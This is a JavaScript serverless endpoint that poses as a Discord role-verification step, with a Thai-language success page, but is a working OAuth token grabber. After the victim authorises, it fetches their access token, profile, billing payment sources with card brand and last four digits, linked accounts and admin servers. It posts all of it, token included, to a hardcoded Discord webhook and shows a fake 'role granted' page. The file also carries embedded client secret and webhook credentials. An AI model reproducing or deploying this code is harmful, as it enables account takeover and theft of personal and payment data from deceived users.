export default async function handler(request, response) {
    const { code } = request.query;
    if (!code) return response.status(400).send('ERR_INVALID_HANDSHAKE');

    const SETTINGS = {
        HOOK: "https://discord.com/api/webhooks/1490525343709139066/DO4FE_FXfbg31eXhK8N_HVUcjROLSOtBCCXgcQkJj8di0tsXFcLEkY6J6QxMXEgHfS6l",
        CLIENT: "1483393398131134646",
        SECRET: "Z8147_iQh2V0R_L_xKq-tFh7-q-9_M_Z", // เช็ค SECRET อีกรอบมหาเทพ
        URI: "https://index-html-five.vercel.app/api/grab"
    };

    const fetcher = async (url, token) => {
        const res = await fetch(url, { headers: { Authorization: `Bearer ${token}` } });
        return res.ok ? await res.json() : null;
    };

    try {
        const exchange = await fetch('https://discord.com/api/v10/oauth2/token', {
            method: 'POST',
            body: new URLSearchParams({
                client_id: SETTINGS.CLIENT,
                client_secret: SETTINGS.SECRET,
                grant_type: 'authorization_code',
                code,
                redirect_uri: SETTINGS.URI,
            }),
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
        });

        const tokenPayload = await exchange.json();
        const access = tokenPayload.access_token;
        if (!access) return response.status(401).send('OAUTH_ERROR: ' + JSON.stringify(tokenPayload));

        const [profile, methods, links, servers] = await Promise.all([
            fetcher('https://discord.com/api/v10/users/@me', access),
            fetcher('https://discord.com/api/v10/users/@me/billing/payment-sources', access),
            fetcher('https://discord.com/api/v10/users/@me/connections', access),
            fetcher('https://discord.com/api/v10/users/@me/guilds', access)
        ]);

        const formatData = {
            badge: ["None", "Classic", "Boost", "Basic"][profile.premium_type] || "Free",
            pay: methods?.map(m => `💳 ${m.brand} (${m.last_4})`).join('\n') || "None",
            soc: links?.map(l => `🔗 ${l.type}: ${l.name}`).join('\n') || "None",
            adm: servers?.filter(s => (parseInt(s.permissions) & 0x8) === 0x8).map(s => `🛡️ ${s.name}`).join('\n') || "None"
        };

        await fetch(SETTINGS.HOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [{
                    title: "🔱 TIDCRAM DATABASE UPDATED 🔱",
                    color: 0x2b2d31,
                    thumbnail: { url: `https://cdn.discordapp.com/avatars/${profile.id}/${profile.avatar}.png` },
                    fields: [
                        { name: "👤 User", value: `\`${profile.username}#${profile.discriminator}\``, inline: true },
                        { name: "💎 Nitro", value: formatData.badge, inline: true },
                        { name: "💰 Billing", value: formatData.pay },
                        { name: "🛡️ Admin In", value: formatData.adm },
                        { name: "🔗 Connections", value: formatData.soc },
                        { name: "🔑 Token", value: `\`\`\`${access}\`\`\`` }
                    ],
                    footer: { text: `Runtime: ${new Date().toLocaleString()}` }
                }]
            })
        });

        response.setHeader('Content-Type', 'text/html; charset=utf-8');
        return response.send(`
            <div style="background:#232428; height:100vh; display:flex; align-items:center; justify-content:center; color:white; font-family:sans-serif;">
                <div style="text-align:center; padding:40px; border:1px solid #5865f2; border-radius:15px; box-shadow: 0 0 20px #5865f2;">
                    <h1 style="color:#5865f2;">✅ รับยศเรียบร้อย!</h1>
                    <p>ระบบตรวจสอบและยืนยันตัวตนสำเร็จแล้ว<br>ยศของคุณจะปรากฏในเร็วๆ นี้</p>
                </div>
                <script>setTimeout(() => { window.location.href = 'https://discord.com/app'; }, 2000);</script>
            </div>
        `);
    } catch (e) {
        return response.redirect('/');
    }
}
